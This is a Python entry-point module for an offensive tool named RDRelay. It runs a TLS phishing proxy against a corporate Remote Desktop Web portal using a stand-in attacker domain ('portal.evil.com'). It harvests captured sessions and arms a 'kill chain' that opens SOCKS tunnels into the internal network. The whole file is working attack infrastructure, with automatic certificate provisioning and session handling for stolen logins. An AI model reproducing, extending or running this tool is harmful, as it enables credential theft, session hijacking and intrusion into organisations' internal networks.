"""RDRelay entry point — wires proxy + harvest + kill chain.

Usage:
  python3 -m rdrelay --target https://rds.corp.com --phish-domain portal.evil.com

Certs are auto-provisioned via Let's Encrypt ACME (HTTP-01) if port 80 is
reachable and DNS points here. Falls back to self-signed for lab testing.
Provide --cert path.pem to use your own (e.g. from ADCS).
"""
import asyncio
import os
import signal
import ssl

from aiohttp import web

from . import harvest, killchain, tlsutil
from .config import parse_args
from .proxy import build_app, log
from .sessions import SessionStore


async def on_capture(sess, cfg, kc):
    if cfg.harvest:
        try:
            await harvest.harvest_session(cfg, sess)
        except Exception as e:
            log("harvest error sid=%s: %r" % (sess.sid, e))
    try:
        await kc.arm(sess)
    except Exception as e:
        log("killchain error sid=%s: %r" % (sess.sid, e))


async def reaper(store, ttl):
    while True:
        await asyncio.sleep(60)
        dead = store.reap(ttl)
        for s in dead:
            log("session expired:", s.sid)


async def run(argv=None):
    cfg = parse_args(argv)
    os.makedirs(cfg.out_dir, exist_ok=True)
    store = SessionStore(cfg.out_dir)
    kc = killchain.KillChain(cfg)

    app = build_app(cfg, store,
                    on_capture=lambda s: on_capture(s, cfg, kc))

    runner = web.AppRunner(app, access_log=None)
    await runner.setup()

    ssl_ctx = None
    if not cfg.no_tls:
        certf, keyf = tlsutil.ensure_cert(cfg)
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(certf, keyf)

    site = web.TCPSite(runner, cfg.bind, cfg.port, ssl_context=ssl_ctx)
    await site.start()

    socks_status = "OFF" if cfg.no_killchain else ":%d" % cfg.socks_port_base
    banner = """
  ┌─────────────────────────────────────────────┐
  │  RDRelay — RDWeb Phishing → Internal VPN    │
  ├─────────────────────────────────────────────┤
  │  Phish URL : %-30s│
  │  Target    : %-30s│
  │  SOCKS     : %-30s│
  │  Output    : %-30s│
  └─────────────────────────────────────────────┘"""
    print(banner % (cfg.attacker_origin, cfg.upstream_origin,
                    socks_status, cfg.out_dir), flush=True)

    reap_task = asyncio.ensure_future(reaper(store, cfg.session_ttl))

    stop = asyncio.Event()
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, stop.set)
        except NotImplementedError:
            pass
    await stop.wait()

    log("shutting down...")
    reap_task.cancel()
    await kc.stop_all()
    await runner.cleanup()


def main():
    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
